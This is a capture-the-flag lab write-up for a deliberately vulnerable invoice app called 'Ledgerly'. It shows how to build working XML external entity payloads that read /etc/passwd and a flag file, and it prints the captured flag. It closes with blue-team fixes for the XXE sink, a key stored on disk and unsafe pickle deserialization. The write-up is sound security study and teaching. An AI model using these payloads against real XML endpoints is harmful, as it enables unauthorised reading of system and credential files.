# Methodology — Ledgerly (XXE → flag; + full chain reviewed)

My working notes. (Ran it on the Ubuntu box: `http://192.168.1.43:9010`.)

## 1. Recon — "wait, XXE again?"

The invoice import takes XML. Remembering yesterday's lesson — **reference the entity in a field the
app actually echoes back** — I went straight for XXE.

First attempt (wrong structure):
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<invoices><ref>&xxe;</ref></invoices>      <!-- syntax error -->
```

The app's real format is `<invoices><invoice><ref>…</ref><note>…</note></invoice></invoices>`, so the
entity has to go inside `<invoice><ref>`. Two more fixes:
- the DOCTYPE name must match the root element → `foo` → `invoices`
- I'd dropped the semicolon after `&xxe`

Working payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE invoices [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<invoices><invoice><ref>&xxe;</ref><note>Q3 retainer</note></invoice></invoices>
```
→ `/etc/passwd` came back in `ref`. XXE confirmed.

## 2. Flag — the shortest path

Since XXE is arbitrary file read and the goal is a readable file, I just pointed the entity at the
flag — no need for the rest of the app:

```xml
<!DOCTYPE invoices [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
...<ref>&xxe;</ref>...
```
```
FLAG{xx3_t0_jwt_f0rg3_t0_p1ckl3_rc3_ch41n}
```

This clearly wasn't the "intended" chain — but red-team's job is to capture the flag by the cheapest
path, and a file-read primitive onto a world-readable flag *is* that path. (A full engagement still
reports the rest — see Part 2.)

## 3. Blue team — all three bugs

Reading the source, the app has three distinct issues (even though only the first was needed):

1. **Signing key on disk** → leakable via XXE. Load it from an **environment variable** instead.
2. **XXE sink** on the import → switch the endpoint to **JSON** (no XML parser = no XXE).
3. **Insecure deserialization** — `/api/admin/restore` does `pickle.loads()` on user data. The fix is
   **not** "check before deserializing" (you can't safely inspect a pickle — it executes *during*
   load); the fix is to **not use pickle on untrusted input at all** → replace with `json.loads`.

Fixes implemented in `Fixed.py` (env-var secret, XML→JSON import, pickle→JSON restore).
